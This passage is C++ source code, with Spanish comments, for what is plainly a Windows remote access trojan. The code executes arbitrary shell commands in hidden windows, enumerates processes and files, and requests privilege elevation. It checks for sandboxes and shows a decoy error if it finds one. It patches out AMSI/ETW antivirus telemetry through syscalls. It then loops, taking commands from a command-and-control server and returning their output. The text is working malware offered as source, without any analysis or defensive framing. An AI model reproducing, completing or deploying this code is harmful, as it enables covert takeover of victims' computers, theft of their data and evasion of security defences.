        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = { sizeof(pe) };
            if (Process32First(snap, &pe)) {
                ss << "PID\tNombre\n";
                do {
                    ss << pe.th32ProcessID << "\t" << pe.szExeFile << "\n";
                } while (Process32Next(snap, &pe));
            }
            CloseHandle(snap);
        }
        return ss.str();
    }
    
    std::string ExecuteCommand(const std::string& cmd) {
        std::string result;
        char buffer[8192];  // <-- BUFFER_SIZE reemplazado
        
        HANDLE hReadPipe, hWritePipe;
        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
        
        if (CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
            STARTUPINFOA si = { sizeof(si) };
            si.dwFlags = STARTF_USESTDHANDLES;
            si.hStdOutput = hWritePipe;
            si.hStdError = hWritePipe;
            
            PROCESS_INFORMATION pi = { 0 };
            
            std::string fullCmd = "cmd.exe /c " + cmd;
            
            if (CreateProcessA(NULL, (LPSTR)fullCmd.c_str(), NULL, NULL, TRUE,
                CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                
                CloseHandle(hWritePipe);
                
                DWORD bytesRead;
                while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                    buffer[bytesRead] = 0;
                    result += buffer;
                }
                
                WaitForSingleObject(pi.hProcess, 30000);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            CloseHandle(hReadPipe);
        }
        
        return result.empty() ? "[+] Comando ejecutado\n" : result;
    }
    
    std::string ExecuteProgram(const std::string& program) {
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        
        BOOL result = CreateProcessA(
            NULL, (LPSTR)program.c_str(), NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi
        );
        
        if (result) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return "[+] Programa ejecutado: " + program + "\n";
        }
        return "[-] Error: " + program + "\n";
    }
    
    std::string ListDirectory(const std::string& path) {
        std::stringstream ss;
        std::string searchPath = path + "\\*.*";
        
        WIN32_FIND_DATAA ffd;
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &ffd);
        
        if (hFind != INVALID_HANDLE_VALUE) {
            ss << "Nombre\tTipo\n";
            do {
                if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    ss << "[DIR] " << ffd.cFileName << "\n";
                } else {
                    ss << "[FILE] " << ffd.cFileName << "\n";
                }
            } while (FindNextFileA(hFind, &ffd) != 0);
            FindClose(hFind);
        }
        
        return ss.str();
    }
    
    std::string ElevatePrivileges() {
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpVerb = L"runas";
        
        wchar_t modulePath[MAX_PATH];
        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
        
        sei.lpFile = modulePath;
        sei.lpParameters = L"--elevated";
        sei.nShow = SW_HIDE;
        
        if (ShellExecuteExW(&sei)) {
            isElevated = true;
            return "[+] Elevación solicitada\n";
        }
        
        return "[-] Falló elevación\n";
    }
};

// ============================================================================
// FUNCIÓN PRINCIPAL
// ============================================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow) {
    
    Logger logger;
    logger.Log("Inicio de ejecución");
    
    AntiSandbox antiSandbox;
    if (antiSandbox.IsSandboxed()) {
        MessageBoxA(NULL, "Error", "Error", MB_OK);
        return 0;
    }
    
    HANDLE hMutex = CreateMutexA(NULL, FALSE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;
    }
    
    if (strstr(lpCmdLine, "--elevated") == NULL) {
        HWND hWnd = GetConsoleWindow();
        if (hWnd) ShowWindow(hWnd, SW_HIDE);
    }
    
    logger.Log("Inicializando syscalls");
    SyscallManager syscalls;
    
    logger.Log("Aplicando bypass de AMSI/ETW");
    AMSIBypass amsiBypass(&syscalls);
    amsiBypass.PatchAll();
    
    logger.Log("Inicializando C2");
    SecureC2 c2;
    CommandProcessor cmdProc(&c2);
    
    antiSandbox.SleepRandom();
    
    logger.Log("Iniciando loop principal");
    while (true) {
        try {
            if (!c2.IsConnected()) {
                logger.Log("Conectando al C2");
                if (c2.Connect()) {
                    logger.Log("Conectado");
                    c2.Send(cmdProc.Process("INFO"));
                } else {
                    logger.Log("No conectado, esperando");
                    antiSandbox.SleepRandom();
                    continue;
                }
            }
            
            std::string cmd = c2.Receive();
            if (!cmd.empty()) {
                logger.Log("Comando: " + cmd);
                std::string response = cmdProc.Process(cmd);
                c2.Send(response);
            }
            
            antiSandbox.SleepRandom();
        } catch (...) {
            c2 = SecureC2();
            antiSandbox.SleepRandom();
        }
    }
    
    CloseHandle(hMutex);
    return 0;
}
